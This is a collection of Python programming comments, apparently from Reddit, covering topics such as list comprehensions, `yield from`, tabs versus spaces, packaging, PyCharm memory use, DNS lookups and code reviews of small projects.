Hah, thanks.
Well, I can't pass up an opportunity this good for a shameless plug. So, may I introduce to you to my project: [Pathomx](http://pathomx.org): a workflow-based analysis tool built on IPython. The project started as part of my PhD studies in metabolomics (analysis of metabolites in biological fluids as an identifier of disease). Analysis of data is long-winded and repetitive, but also requires tweaking and interpretation. Existing analysis tools were too manual, or too automatic, so Pathomx [is somewhere in the middle](http://docs.pathomx.org/en/latest/_images/pathomx-v3-visual-editor.png). In essence it's a 'worfklow analysis' tool that allows you to perform data analysis using using reusable 'script' components that you connect together with drag-drop. If there isn't a tool to do what you want, you can also write custom mini-scripts. It's based on IPython and will be able to squirt out IPython notebooks and standalone python commandline scripts in an upcoming release. You would get the opportunity to experience - - Python scripting (same as standalone scripts, but within the application) - Numpy, Scipy (numerical computing) and Pandas libraries for data analysis - data analysis through using scikit-learn libraries - Python plotting (using matplotlib, - Qt (PyQt5) APIs for GUI building - IPython cluster processing ...and since it's only me working on it, I could really do with some help.
&gt;What is the advantage of the Item class, instead of using using a dict? My motivation for the Item and HackerNews classes was that I might want to add methods to it in the future. But for this use case you're right. Its best to have a top level function for Hacker news and return a dict. Thanks for the other two points, I'll make the changes. (Edit: pushed the changes) 
Removing vowels can be done more easily: "removing vowels".translate(None, "aeiou")
This question SUCKS! a list comprehension is essentially syntactic sugar for a for-loop. so you might as well ask what the most interesting thing someone has done w/ a for loop is, and that's just ridiculous. 
How security releases are handled? It is some kind of scrapping/parsing specific changelogs?
The list of python packages is retrieved with a simple ``pip freeze``. Figuring out if a python package is insecure is a combinaison of many things, like parsing changelogs, monitoring the CVE database, checking some packages by hand, etc.
In my experience the Python world is not the worst in that regard. And I say that just as a I broke a website by updating django-blog-zinnia from 0.14.1 to 0.14.2 last week. The Unity / XCode combo is quite an explosive thing for instance...
Maybe you should flatten it a bit to a list of dicts: {'name': name, 'ip': ip, 'mac': mac, 'host': host, 'group': group}
No, a list comprehension is an expression that describes a list using a particular syntax. Usually they compact for-loops into a simpler, more readable form, but there are things which can not be expressed as a list-comprehension which can be done in a for-loop, so your description isn't quite correct. Given the performance gains (both in time and memory) that using the correct list-comprehension can bring, I think its a very good question.
This does not look like a `yield from foo`. It looks like a `for x in foo: yield x` which is not even close to being the same thing.
You can easily install PyQt/PySide on Windows.
(Author here) You should check out the yield from implementation in `ceval.c`. Basically, that's what it is, but with fiddling with the .send method on the Generator, which this does. Do you have an example where this breaks? ([cpython source!](https://github.com/python/cpython/blob/master/Python/ceval.c#L1925-L1957)) -- that clever `f-&gt;f_lasti--;` is your for loop :)
The thing is `yield from` will not only propagate `yield`s, `send`s and `throw`s, it also lets you `return` values that become the right-hand value of the expression.
If you check the code out, you'd see that is implemented! :)
Ok, my bad. Return is but throw does not seem to be.
Aww, thanks :D, though I assure you that I am pretty bad about following pep8!
I'm the one who did the code review (and also did the blogpost). I said exactly the same thing on the pull request, and wrote [a unit test to prove that it wasn't propagating exceptions](https://github.com/hylang/hy/blob/master/tests/native_tests/native_macros.hy#L244). But it turned out the unit test proved that it was! I was surprised also.
If you distribute binaries of your python app, this is hardly an option. Either you force users to download and install Qt or you have to bundle Qt libraries in your distribution package, which will add something like 50mb extra. 
Pretty cool! I noticed the LICENSE file in your repository mentions BSD, but the variable in your setup.py file says it is GPL. Which is it?
I realize that this kind of thing is probably frowned upon, but nesting comprehensions can be a lot of fun. data = pd.concat([pd.concat([loadCSV(i.name, True) for i in l], axis=1) for l in fileNames], axis=1, keys=importRange, names=['Date', 'Factor']) I think its arguably more readable than the equivalent for loop if you know that fileNames is a list of lists since it has been distilled to a concatenation of a concatenation.
Okay thank you for some info to look up. 
For your point 4), I prefer using `itertools` for this. `list(itertools.chain(*matrix))` has the same results as `[i for row in matrix for i in row]`.
Ummm are you saying that `pip` or `easy_install` do not work for you? Bc my suggestion is virtualenvwrapper and pip. 
Does it work on windows ?
If there's any questions: I'm listening :)
thank you that scheme was the one I was looking for. And about the class it is the next step. I want to learn things step by step. When I am confident with basic stuff I will replace the code with improved code :)
What's RAL? (You might want to have your docs explain this, or link to something that does.)
you should try at [/r/learnpython](http://www.reddit.com/r/learnpython) or [StackOverflow](http://www.stackoverflow.com)
Not shady at all. Your employers were abject idiots if they couldn't recognize the value of automation or their cheap new "programmer". 
Relevant: https://github.com/brython-dev/brython-in-the-classroom It is a browser based simple ide that runs entirely on the client side. It uses brython and tries to be 100% compliant with the Python language specification. It is un active development and it wants to be an easy to use python environment letting you to save and share your work.
I think I'm refering to version managment. Maybe there's a better way to say it
It seems they've only just added it to Ubuntu 14, but that's the first time I've noticed that to be the case on any distro. Xubuntu 14.04, does not have it preinstalled. CEF looks very interesting. I wasn't aware of it.
Well instead of using any terms, what exactly do you want?
&gt; "No false positives" whats this
If you want the highest possible chance of this happening, why not create a GitHub repo?
[YAGNI](http://c2.com/cgi/wiki?YouArentGonnaNeedIt)
Many different ways to go about this.. you could download the package for them and put your code and the package in a zip file... then just name your .py file to \_main\_.py you can then execute the zip file with the python interpreter python "nameOfYourZipFile.zip" this will execute the file in the zip file with the name \_main\_.py in your .py you would just have some basic file movement command to put the package in the directory needed for it to be importable
Ok, thanks! I appreciate it!
We use [pyshop](https://pypi.python.org/pypi/pyshop). It allows everyone to continue to pip install like you are used to but you can pull from your own cheeseshop. If you request a package that isn't there, it will get it from PyPi and make a copy in your pyshop. For internal code, we just package up modules with setup.py and upload them. Then they are available for whoever needs it. 
Thanks I hadn't known about pypi server. That looks like it would work well. I usually only work out of one file version (I'm the only one working in this code base) and I don't really know good practices for wider development. Could you recommend some?
its a hacky way to do it, but should work
Why do you want to do this? Given that users can download your code, why can't they simply download PyWin32 via the requirements in your own requirements.txt or setup.py?
Well, for starters, hopefully you're already using a version control system like git or Mercurial. Then following some sort of versioning, such as [semantic versioning](http://semver.org/), should be incorporated with your versioning for the package index. For easy referencing, you should also add that version number as a tag in your code repository.
I had the same problem. Added Ubuntu as a dual boot option to my windows laptop and all of jetbrains products, eclipse and several other ides have been running great ever since.
Even though I work for a Fortune 500 Company they are in the stone age regarding software management. Seriously you don't want to know. "Configuration Management" here is having a department manually manage files and folders. Thanks for the advice. I hadn't know about semantic versioning.
actually it wasn't much of a battle... kmeans isn't very good at clustering geospatial data and dbscan is.
Unique is very strong word. Nothing is unique. If you think otherwise you just don't know enough. Many things are easy with dynamic languages, that are less easy (i.e. without creating a dynamic runtime infrastructure) in static typed languages. My experience is other way around. For instance a few design patterns exist only because of static typing. And are pointless/"builtin" with Python. Python is readily multi-paradigm; procedural/scripts, object oriented, functional (arguably doing none of them well). Few popular languages provide that flexibility. Although that is probably just me not knowing enough about every popular language.
Trying To Get Yahoo SMTP To Work, The Gmail Works Fine But When I Try To Send An Email From Yahoo, It Lags The App, Then The App Freezes - So I Force Quit The Program
Done! https://github.com/asweigart/idle-reimagined This is still in the planning phases, so there was no code to start writing, but I might as well set that up. Thanks!
This looks promising. But one reason I want to go with a refactor of IDLE is because online resources require an internet connection. (I've run classrooms with unreliable wifi. It's a serious pain.) But if there's a way to run the backend for Brython locally, that'd be great. I couldn't find anything about that from pyschool.net or the git repo though.
You could use the other things people in this thread have mentioned. Another option is to use anaconda server (http://continuum.io/anaconda-server). It's been designed pretty much for your use case, if I've understood you correctly. Downside: It's not free.
I've always felt that way until I started trying to edit code through a web IDE. No way to enter a tab. It just takes you to the next field.
PEP 8 also says to ignore it when you have a reason, and preference is a good enough reason. Just be consistent with your choice. 
But if everybody used tabs, we'd all have an easier time using code taken from anywhere. 
It's not just spaces, but explicitly [4 spaces]( https://www.python.org/dev/peps/pep-0008#indentation). That section of PEP8 comes right before the tabs or spaces section. &gt; If one tab is one indent Your editor, IDE, viewer, or however you read and write code could be configured to interpret a tab character to be 1, 2, 3, 4, x, y, z... columns. *That* can lead to ambiguity. People have and will continue to argue back and forth whether tabs or spaces are better. In the end, consistency is what's most import. Part of the Zen of Python is that "explicit is better than implicit," so we remove the argument and ambiguity by setting a standard of using 4 spaces to indent. If it really bothers you, just configure your environment to translate hitting the tab key to be the same as 4 spaces. &gt; copy/paste problems arise when taking code from the web Copy/pasting of code found on the web is not a good practice, but this is a whole other topic entirely.
Hmm so I would say python is one of few modern scripting languages that encourages and works well with and encourages imperative programming.
&gt; Your editor, IDE, viewer, or however you read and write code could be configured to interpret a tab character to be 1, 2, 3, 4, x, y, z... columns. That can lead to ambiguity. No, because one indent will still be one indent, and will appear the way you like it. &gt; "...so we remove the argument and ambiguity by setting a standard of using 4 spaces to indent." If only! Not only is that standard time-consuming (Unless you've redefined a function key to automatically insert 4 spaces, it's a pain), it's also hardly ever followed. Again, if it were always tabs, then it would always be right. &gt;Copy/pasting of code found on the web is not a good practice, but this is a whole other topic entirely. Some of us prefer to live in the real world, where code gets reused via the most expedient method. That includes taking it from the web.
Agreed. I've yet to spend much time entering code in a web IDE for just such reasons... 
The problem I see most often is when using tabs for indent, you need something else for alignment so you use spaces. Now the "tabs are always one indent" argument doesn't help because this authors alignments are off (unless tabs are interpreted as the same width). &gt; (Unless you've redefined a function key to automatically insert 4 spaces, it's a pain) Most IDEs/editors allow you to use the TAB key on your keyboard to enter a certain number of spaces. Lastly, for me at least: If you are using code that someone else wrote it should be in some sort of revision control if it is worth reusing. Edit: Also you seem to have very strong opinions and expressing those opinions strongly while everyone else is trying to stay civil.
&gt; when using tabs for indent, you need something else for alignment so you use spaces. Huh? When you use a tab, you see (For example) two-space indent. And everything you see in that file that was indented with tabs has a uniform two-spaces per indent. When I open that file, since I prefer 3 spaces per indent that's what I see. Through the whole file. And so on... &gt; If you are using code that someone else wrote it should be in some sort of revision control if it is worth reusing. So, you've never grabbed a snippet from reddit, or stackoverflow, or whatever? EVER? 
Alignment using tabs for indentation, spaces for alignment (actually all spaces because web browser): func_result = my_func(a, b, c, d, e, f) So most people like to have argument `a` and argument `d` line up. If they are not perfectly on your tab's indentation then most people use spaces to align `d` under `a` (of course mixing tabs and spaces is a bad idea in python, but in other languages...). So you did that with tabs representing 4 spaces, but your coworker prefers 8 spaces and now it is misaligned for him. Unless of course everyone is careful and didn't try to save time by hitting the tab key one extra time. If you haven't already, I suggest googling "tabs vs spaces" and you will get most of the arguments people have for this kind of thing. Similar to arguing religion, no one comes out a winner and everyone will prefer what they prefer. My preference: Do what the original author did. Edit: Interesting enough, my function call above is aligned in the editor.
Like I said google it. Everyone has their preferences. Edit: If you feel so strongly contact Guido or the Python-dev list and see how they feel. Edit 2: Removed the not so nice part.
Have you considered packaging your script into an exe? If that's an option you could look into pyinstaller or py2exe. That way your users don't need to install anything I'm order to run your code
&gt; No, because one indent will still be one indent, and will appear the way you like it. What is an indent? There is no precise definition. A space is equal to one column. The tab character in ASCII is 0x9, which could be interpreted by a specific program to mean any number of things. There's a distinct difference between the tab character and the result of pressing the tab key on a keyboard. Pressing the tab key on the keyboard does not always produce the same default behavior in every program, so you can't always make assumptions. Maybe it enters ASCII 0x9 or maybe it enters n spaces for any number n between 1 and infinity. It's very ambiguous. Moreover, you can usually edit a program so that hitting the tab key on the keyboard does whatever you want it to. More ambiguity. Some people think a proper indent in code should equal 2 columns. Some think it should be 4 columns, etc. Some people think it should be ASCII 0x9. As I said previously, consistency is the most important answer in the decades old tabs versus spaces debate. Everyone has different opinions, so there will never be one answer that's acceptable to all. Hence why PEP8 is a suggestion for a style standard and not a rule. If you don't like it, then you don't have to use it, but it is the declared standard for Python. It is a very Pythonic principle to be explicit like this. &gt; Not only is that standard time-consuming (Unless you've redefined a function key to automatically insert 4 spaces, it's a pain) You don't have to configure a function key; as I said, you can very easily modify your IDE/text editor settings so that pressing the tab key inserts how every many spaces, or ASCII 0x9, or whatever you want. &gt; Some of us prefer to live in the real world, where code gets reused via the most expedient method. That includes taking it from the web. The web is a fantastic reference, but blind copypasta is often a sign of not understanding what the source code does. In general, it's much better practice (e.g. yields less buggy, more maintainable code) to either use a pre-existing library or rewrite concepts you find so that they fit your exact needs and/or style. If you're really complaining about not being able to copy and paste code from anywhere and just have it work without any sort of adjustments, indentation style or otherwise, then yikes.
Cool project. I'm a python newbie, but I have been looking for a good way to import and play with x,y,z lat/long/altitude coordinate data. Your site looks like it has some good information, so thanks for that!
There are benefits to tabs but I don't want to tell anybody else how to write their code.
Go grab it for free now: https://www.kickstarter.com/projects/programming/learn-python-visually-2/
I don't have time to do an in-depth critique, but this looks pretty decent. It's well organized and it's clear how it works, even if that isn't necessarily the most hyper-efficient and optimized way to write a game of snake. The bit you've mentioned where you create a new instance of your `Display` object when the snake dies definitely sticks out as something that should be reworked. I think you'd be better off writing a `spawn()` method for the snake, and when the snake dies just call that and reset the score. I have a quick pygame snake implementation lying around if you want to have a look: https://gist.github.com/onesandzeroes/b5c7136a7273a08739d0 It was a very quick attempt to get Snake going in Python, so probably shouldn't be looked at for examples of best practices. The one thing it does have going for it is I've abstracted the play area into a grid, which means I can just do things like move the snake one square at a time, rather than always dealing with the raw pixel coordinates. It's possible that that isn't the best abstraction to use, but you should always try to think about how you can put together a higher-level representation of your game so you aren't always fiddling around with the low-level details like the exact number of pixels you want the snake to move.
Great! I recommend migrating the wiki to GitHub as well: https://github.com/asweigart/idle-reimagined/wiki Wikia is a bit nasty with the ads and stuff. 
Doesn't work in Linux because of the file paths. I changed them from '\' to '/' and that fixed it. AFAIK the standard delimiter is '/', even works for Windows. Another think is that the settings are not persistent between games. EDIT: AFAIK
Wow, that's really a much better idea. I'm on it.
I have, I just wasn't sure if it would work with imported packages. Do you know if it does?
Thanks for taking the time to look :)
&gt; No, a list comprehension is an expression that describes a list using a particular syntax. That's an infinitely worse definition than mine... a list comprehension describes the result of executing some code on each member of a list. its like map(). to say it 'describes a list using a particular syntax' is highly misleading, that implies no work is being done. furthermore, my claim that it is merely syntactic sugar for a for-loop isn't disproved by the fact that it cannot do everything a for loop can do, its sugar for the simple/common cases. It's not a good question, because the answer will always be the 'work' which is being applied to each member in the original collection, the list comprehension is inconsequential and can ALWAYS be replaced with a dead-simple for loop.. hence its not remotely interesting. a list comprehension replaces for ... in ...: and sometimes an 'if ...:' on the next line. never anything more than that. i defy you to prove me wrong., 
Nope to what? everything simonorono said is true except the 'as far as I know...' bit, but there's no such thing as "the standard delimiter" anyway, so your 'Nope' is just as wrong. 
Stopped watching at 'Three single quotes for a multiline comment.' don't tell lies, not even to make things easier for noobs. 
Nope to their implication that the correct way to deal with file paths in python is to hardcode forward slashes. AFAIK, the os module solves this and not some standard delimiter.
What's New in the latest version (0.2.4.post1): * `settings_path` parameter – lets you specify a file containing default values for multiple settings * a decorator `used_unused_keywords` which lets a function easily determine, per-call, which of its keyword parameters were actually supplied by the caller, and which received their default values * loggers can be specified by name, not just as instances * loggers can indent by call level too, and work well with `log_message` Plus more examples, documentation thoroughly re-proofed, internal improvements, a littlebugfix or two, more. Enjoy! 
I was sort of OK with programming keywords in search history triggering the system... then it occurred to me that maybe they are also monitoring other words and sites, and excluding users from any future chance of getting interviewed. If the code was mine, I know I would. Then I found myself avoiding to click nsfw stuff on reddit, because it might flag me as a sicko and kill my chances of ever getting interviewed for the dream job...
Pip can install python packages directly from a git repo, so you don't need to install pypiserver yourself (which is a pain in the ass), like this: $ pip install -e git+ssh://git@github.com/user/repo.git#egg=repo Or from a requirements.txt file: -e git+ssh://git@github.com/user/repo.git@master#egg=repo
Or if you just want a really simple A record lookup, `socket.gethostbyname("google.com")`
or you can build a Rube Goldberg device....
Interesting. Makes me wonder what the cause of the slowness was if you weren't producing log output (while set to CRITICAL)
use Git. specifically, use Github, since you probably don't have time to manage your own git server. git allows you to do version control in a snap, as it tracks all of your code changes. distributing the code is very simple as well, since you can simply clone your git repo or let pip do it for you.
 /r/learnpython Also, python 2: `print "some text"` python 3: `print("some text")` 
I'll definitely will take a look at it! 
Why not use the official one? https://developers.google.com/api-client-library/python/apis/gmail/v1
I think what you mean is "which is faster" or "which one has a smaller memory footprint". Bloated is a bullshit buzzword.
Yep this has interesting applications in agriculture such as providing simple reviews of nitrogen sensor data.
&gt; You should never use 'for x' loop to describe to chained generators. The correct way of doing it is always a while loop. Do you have more info on that? What's the difference?
Yup it does. I've created exes containing pywin32 before with pyinstaller and it's pretty easy
As an alternative, you could also have a look at ws4py. I was using this and it was pretty lightweight (as far as I was concerned). I've been running it on android devices and it worked like a charm
lol pretty cool...typed porn tho and got "aint nobody searching for that". I mean, you could be right...but for some reason Im doubting that porn aint searched lol ;)
I do not know. You can test it and file issues here: https://github.com/arteria/virtualenv-mgr/issues .
I had the same question just a week ago, but I couldn't find a convincing answer. Then I've chosen socketio because it seems to have more active community. I guess, not know, that socketio is more suitable for web development. But for your situation a light weight alternative would go better.
I don't think you're wrong, but you should probably learn how to write without sounding like an asshole
I sometimes do 10K or more lookups and I need to do them quickly, so I use this http://www.catonmat.net/blog/asynchronous-dns-resolution/
print is a function on python3 so it needs to be like: print("whatever")
a few tips: - focus on code quality before efficiency. Snake is never going to need to worry about a few CPU Cycles, but you are going to tire of dealing with subpar code. - heavy use of magic numbers. get rid of those. - as mentioned already, abstract away the pixels, you should be working with a 'board' of some kind. - instead of the strings 'left', 'right' etc, try storing directions as a tuple which you can directly add to the current position. ie. LEFT = (-1, 0). tuples are immutable which makes this work really nicely. 
Which version do you recommend? And what are the changes to if and else statements?
Yeah me too!
Imho this looks much better; https://github.com/FEE1DE4D/KickassAPI
In a tight loop which isn't doing much, adding a logging call can add appreciable overhead. In the example, the level of the root logger is set to `CRITICAL`, but the level of the logger actually used isn't set. So logging has to traverse up the hierarchy (only one level up - but in a tight loop, it all counts) to see what the effective level is. The effective value can't be cached, because it might change at any time. Also, if the loop before you add logging is just doing I/O in C/C++, the CPU utilisation would be low. If you add logging (which does computation), clearly the CPU utilisation would go up. In a tight I/O loop the proportionate increase would of course be high, but in general (where loops have computation as well as I/O) logging overhead, while present, is less of an issue. 
Thanks! The LICENSE file was correct, it's BSD. I've updated the `setup.py` to match.
I mercilessly abused side-effects, much to the chagrin of the rest of the community. [thread.start() for thread in workers] [os.rename(x, "1" + x[1:]) for x in os.listdir(os.getcwd()) if x.lower().endswith("jpg")] etc. Don't do this, by the way.
Oh hey, that reminds me; I made something called "ezcsv" 'cause I was sick of dealing with them, and that abuses nested comprehensions. def create(inp): return("".join([",".join([str(x) for x in row]) + "\n" for row in inp])) def read(inp, delim = ",", rowdelim = "\n"): out = [x.split(delim) for x in inp.split(rowdelim)] if len(out): if not out[-1] == [""]: return(out) else: return(out[:-1]) else: return([]) 
I didn't know about it!! Thank you, Sir! :)
My $.02 on the "Clear" category: 1) Make `north` `east` and `@property` decorated functions. Allows for modifications to all dimensions after construction. 2) Make corners a `@property` wrapped function, and make it more readable and maintainable: @property def corners(self): """Calculate the four corners of the Foo. """ return { 'north-east': (self.north, self.east), 'north-west': (self.north, self.west), 'south-east': (self.south, self.east), 'south-west': (self.south, self.west), } Using `product`, a list-comprehension, and a dict-comprehension to create a 4-item dictionary is overkill and makes me have to think about what the hell you're doing in that function when I happen upon your code 24 months after you're gone. But I'm a grumpy old man who likes things obvious and simple.
What do you mean by "at a terminal". When I try to run $ pip install -e from cmd it gives me -e option requires one argument. When I run from Python 3.4.1 Shell (IDLE) it tells me install is invalid syntax. Can you help?
The pip -e needs either a directory or a remote repository. In the instructions pip install -e . the . is the directory of your local dataset clone. Edit: missing a word
Thanks so much for the quick reply. I tried typing in pip install -e C:\Python34\yelp_dataset_challenge_academic_dataset which is the path of the json file. I get an error that says "C:\Python34\yelp_dataset_challenge_academic_dataset should either be a path to a local project or a VCS url beginning with svn+, git+, hg+ or bzr+ storing debug log for failure in C:\Users\User\pip\pip.log"
You have to change into the folder, because pip -e will look at the setup.py file in the folder. cd C:\Python34\yelp_dataset_challenge_academic_dataset pip install -e . And I would install it into a different location like for instance a dedicated directory where you keep all of your code, so you don't mess up your python installation by mistake.
If the chained generator isn't receiving values via the .send() method, then there is no difference. If it is, there is no way of doing that because you have to send these values during the loop. This is similar to the reasoning of why 'yield from' was used in asyncio instead of using plain 'yields': https://groups.google.com/d/msg/python-tulip/bmphRrryuFk/aB45sEJUomYJ By Guido's example: def driver(itr): print(itr.send((None))) itr.send(42) def gen1(): val = yield 'okay' print(val) yield driver(gen1()) outputs (http://goo.gl/Q5qpz) : okay, 42 Now, if you have another generator between the driver and gen1, 'yield from' chains generators transparently without any problems. def middle_gen(): yield from gen1() driver(middle_gen()) outputs: okay, 42 Try doing the same with simple yields and for loops...You need to send values during the for_loop and you have no control over that. That's why you need a while loop. The simplest 'yield from', without any exception handling for brevity, is sth like this: def yield_from(gen): y = None while 1: y = yield gen.send(y) Lets try it in a new generator middle_gen2: def middle_gen2(): return yield_from(gen1()) driver(middle_gen2()) outputs: okay, 42 
Ok that's a big surprise for me, thanks for your input. Look my reply above for the second part.
I suspect this is homework? In any case, /r/learnpython would be better suited.
&gt; If you are about to ask a question, please consider /r/learnpython
So your idea is to accept a POST request with a file, extract some information from the file, place the file into some kind of queue for later processing and then... make a POST request to the original sender of the request? Why not send the important data in response to the original POST request?
http://docs.python-guide.org/en/latest/
If you want to use the IMAP protocol, imbox (https://github.com/harmy/imbox) can be a nice and easy to use library (and you are not restricted to gmail)
 &gt;&gt;&gt; from diveintopython.net import is_anagram &gt;&gt;&gt; is_anagram("FioraMaster18", "AFartIsomer18") True
There are many uses for sets. This is not one of them. Hint: "exactly". Another hint: There's a neat [built-in function](https://docs.python.org/3/library/functions.html) which makes this problem very easy.
First: that's 10,000 connections per second. (Edit: per minute - not as bad) You're going to run into this: http://en.m.wikipedia.org/wiki/C10k_problem If you figure out a way to accomplish your goals on a single server, you're doing better than google. You'll need a few servers behind some kind of load balancing scheme. Nginx + wsgi should be fine - it's not likely to be your bottleneck. Your bottleneck will probably be network I/O (file uploads). Since you're spreading requests across multiple servers, making those servers stateless is advisable. This means (amongst other things) that after you respond to a request, the API hosts don't do any additional work. I suggest that your API host store the file (in some central place, like an object storage cluster) add a reference to the file on a queuing service, and return a 200 or 204 to the user. Let a queue worker handle the async response. If the async response needs to happen quickly, and the full processing happens much more slowly, just add the file reference to two queues, where each one is handled by a different kind of worker. One worker pulls out the single field and posts the async response, while the other does the full processing. Keep your queue workers on separate machines or VMs so you can scale them separately. Check out the celery library for Python for your queue workers. DNS offers cheap (but not evenly distributed) load balancing, or you could look at anycast, or a physical load balancer. I agree with the other poster that, if possible, you should return the single field synchronously. It reduces complexity. With more details, I may be able to offer some more advice.
#####&amp;#009; ######&amp;#009; ####&amp;#009; [**C10k problem**](https://en.wikipedia.org/wiki/C10k%20problem): [](#sfw) --- &gt;The __C10k problem__ is the problem of optimising [network sockets](https://en.wikipedia.org/wiki/Network_socket) to handle a large number of clients at the same time. The name C10k is a [numeronym](https://en.wikipedia.org/wiki/Numeronym) for [concurrently](https://en.wikipedia.org/wiki/Concurrent_computing) handling ten thousand connections. The problem of socket server optimisation has been studied because a number of factors must be considered to allow a web server to support many clients. This can involve a combination of operating system constraints and web server software limitations. According to the scope of services to be made available and the capabilities of the operating system as well as hardware considerations such as multi-processing capabilities, a multi-threading model or a [single threading](https://en.wikipedia.org/wiki/Single_threading) model can be preferred. Concurrently with this aspect, which involves considerations regarding memory management (usually operating system related), strategies implied relate to the very diverse aspects of the I/O management. &gt; --- ^Interesting: [^Lighttpd](https://en.wikipedia.org/wiki/Lighttpd) ^| [^Reactor ^pattern](https://en.wikipedia.org/wiki/Reactor_pattern) ^| [^Tornado ^\(web ^server)](https://en.wikipedia.org/wiki/Tornado_\(web_server\)) ^| [^Libevent](https://en.wikipedia.org/wiki/Libevent) ^Parent ^commenter ^can [^toggle ^NSFW](/message/compose?to=autowikibot&amp;subject=AutoWikibot NSFW toggle&amp;message=%2Btoggle-nsfw+cma160w) ^or[](#or) [^delete](/message/compose?to=autowikibot&amp;subject=AutoWikibot Deletion&amp;message=%2Bdelete+cma160w)^. ^Will ^also ^delete ^on ^comment ^score ^of ^-1 ^or ^less. ^| [^(FAQs)](http://www.np.reddit.com/r/autowikibot/wiki/index) ^| [^Mods](http://www.np.reddit.com/r/autowikibot/comments/1x013o/for_moderators_switches_commands_and_css/) ^| [^Magic ^Words](http://www.np.reddit.com/r/autowikibot/comments/1ux484/ask_wikibot/)
Using a set would remove duplicates of letters, so you'd get false positives. In order to be an anagram you have to be able to exactly rearrange the letters of one word or phrase into the other word or phrase. Here's one implementation: def is_anagram(s1,s2): s2=list(s2) for letter in s1: if letter in s2: s2.remove(letter) else: return False return not s2 Edit: Duh. Much easier: def is_anagram2(s1,s2): s1=sorted(s1) s2=sorted(s2) return s1==s2 
Ah how crass of you :p. I'm sure it's probably one of the most common searches making the rounds - we have safe search active for the time being just to keep things as family friendly as possible
is_anagram = lambda s1, s2: sorted(s1.lower()) == sorted(s2.lower()) print is_anagram("FioraMaster18", "AFartIsomer18")
Oh that's a shame, we'll have to have a look into that - thanks for letting me know. Good to hear that it was enjoyable until it broke!
Ah, the sending part requires a while loop, of course. Your reply above seems to have been caught in the spam filter by the way, I see it in your userpage but not here (note: you will see it here anyway, while logged in as yourself). Message the mods.
Ah, I was thinking of the other one.
Concurrency is killer. A post below indicates that's 10k/second- but I think it's 10k/minute, or around 170/second- which should be feasible. That said, it depends on how long it takes to process each request. I can build a simple, do nothing tornado web app in a few minutes that will easily handle five times that load on a single node. With only the following very basic tornado web app, I was able to get Requests per second: 1077.18 [#/sec] (mean) (reported by apache bench, -n 1000 -c 100) import tornado.web from tornado.options import options class BaseHandler(tornado.web.RequestHandler): def get(self, *args, **kwargs): self.write("ok") def post(self, *args, **kwargs): self.write("ok") def main(): """ Regular Execution. """ tornado.options.parse_command_line() application=tornado.web.Application([ (r"/(.*)", BaseHandler) ], ) application.listen(9000) tornado.ioloop.IOLoop.instance().start() if __name__ == "__main__": main() If fronted with NGINX, you would get much greater throughput than this single-threaded instance could provide. Now- the trick is, as I said, with the "something". Without knowing more about what you're going to do with the embedded file, it's hard to say what to do. Options you have: Non-blocking/asynchronous code via tornado. Most of what you're doing is i/o bound I assume- so you would need to code this part carefully. Non-blocking asynchronous tasks via Celery and RabbitMQ. I don't have this set up in my personal lab right now, but I've managed to push thousands of simultaneous jobs through a Nginx-&gt;Tornado-&gt;Celery-&gt;RabbitMQ setup in my company lab, which would scale up very easily, and provide instrumentation/telemetry/metering, for a very robust production offering. So, Gian- what is it we're doing with this posted file? Also- what feedback is required? Are you okay with accepting the file and returning a job id that can be queried later? Or do you need to respond with some kind of file-valid response in the posted request? What's the use case like? 
..and I really hope you respond, I'm quite interested in this for some reason. :D
I had to stop using it for this reason. The memory usage was consistently around what you're seeing, and I unfortunately have to work with legacy hardware at work. 
Given its just a Java app, have you tried tuning the JVM parameters for min/max memory? Also what JDK do you have installed?
I guess OP's method is good if you want to use specific name servers to resolve it; but yeah, gethostbyname is my preferred method as well.
&gt; how would you feel.... pleased. and I would expect pull requests from the BA
It can use a lot of memory yes, but usually the memory is just allocated not used. Java and by extension PyCharm do not aggressively recover memory automatically when not in use. It allocates a big chunk and then lazily puts things in and takes things out of that space. To get more insight you can enable an option called, "Show memory indicator" under Appearance. This will put a meter at the bottom right of your window which can break down the allocated heap and the "used" memory. Clicking this indicator will run some sort of garbage collector. Most of my projects are from 100M-200M after clicking this (though I normally leave it off since I have 16GB of RAM). PyCharm in the simplest scenario is still doing an absolute pile of things so a higher memory consumption than your standard text editor is to be expected. That being said if you just don't have the resources to run PyCharm and all of its IDEness many people regard Sublime Text highly. Though still firmly in the text editor camp.
Hmm, I've got a small-sized Flask app open right now, and PyCharm is noly using ~410MB of RAM (Win7/64-bit). The indexing process will suck up some power though, but it generally only does that on load. [Their support](https://intellij-support.jetbrains.com/home) is pretty friendly, it probably wouldn't be a total waste of time to ping them over there and see if they have any suggestions.
Usually they're posted in a day or two at [pyvideo](http://www.pyvideo.org). Pyvideo has videos from most Python based conferences.
Awesome. Thanks! I'll keep an eye out for them. 
That isn't defining a function, its calling one
Thanks, but what do you mean by 'heavy use of magic numbers.' ?
Thank you so much for your help! I was able to get install as I realized I needed to download the entire github ZIP (https://github.com/Yelp/dataset-examples) so that it could reference the setup.py file. Now when I run tox I get OSError: [WinError 193] %1 is not a valid Win32 application Can you help with this? I thought getting this json converted to csv would be a lot easier but I'm having a lot of trouble.
If you only want to link to Gmail inboxes, this is a no brainer.
&gt;If every single one of your developers must specially configure their software to show off the source code as you and others have intended, don't you think you're being a bit unreasonable? Wow, you just don't get it. The idea is that they can configure their editors to show code they way THEY like it. So, I don't have to look at your crummy 4-space indent if I prefer to see 2-space indent. By making everybody see YOUR code with the preferences that YOU'VE decided on, it's YOU that's being unreasonable. &gt;Imagine switching from "everyone sees the code formatted in a style" to "everyone must configure on their own time and dime to show off to source code in a way they think it's best". Ahhhh, but they don't have to. They can keep the defaults. 
Looks like you have a small function inside multiple loops. Look to factor that loop out into larger array operations instead. Using list comprehensions will be faster here because the computation you're doing isn't the expensive part, the looping is. Comprehensions are significantly faster than loops in Python.
I'll expose my amateurishness here by asking this, but i need to know. Why is there a text editor camp? A professional programmer friend of mine is part of the same camp, and he's passionate about it. I use PyCharm at home, Spyder/Anaconda at work for scientific computing stuff and data analysis and both seem to make my life a lot easier. I still feel inadequate for some reason. One question that would help me take the pure text editor route would be, "How do you quickly evaluate a block of code in a text editor?"--the process flow in something like Spyder is simply, "highlight, hit f9. done", but with a text editor it's much more difficult for me. 
